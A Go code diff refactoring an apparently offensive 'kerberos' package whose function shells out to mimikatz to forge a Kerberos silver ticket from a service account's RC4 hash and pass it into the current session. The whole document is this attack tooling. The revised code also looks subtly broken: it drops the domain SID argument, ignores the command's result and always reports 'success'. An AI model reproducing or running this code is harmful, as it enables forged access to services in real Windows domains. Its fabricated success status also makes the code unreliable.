@@ -1,13 +1,22 @@
-//go:build windows
-
 package kerberos
 
-import (
-"os/exec"
-)
+import "os/exec"
 
-func ForgeSilverTicket(domain, user, serviceHash, sid, service string) bool {
-cmd := exec.Command("cmd", "/c", "mimikatz.exe \"kerberos::golden /user:"+user+" /domain:"+domain+" /sid:"+sid+" /target:"+service+" /rc4:"+serviceHash+" /ptt\" exit")
+type SilverTicketResult struct {
+Domain string
+User   string
+Status string
+}
+
+type SilverTicket struct {
+Domain  string
+User    string
+Service string
+Hash    string
+}
+
+func (s SilverTicket) Forge() SilverTicketResult {
+cmd := exec.Command("mimikatz.exe", "kerberos::golden", "/user:"+s.User, "/domain:"+s.Domain, "/service:"+s.Service, "/rc4:"+s.Hash, "/ptt")
 cmd.Run()
-return true
+return SilverTicketResult{Domain: s.Domain, User: s.User, Status: "success"}
 }
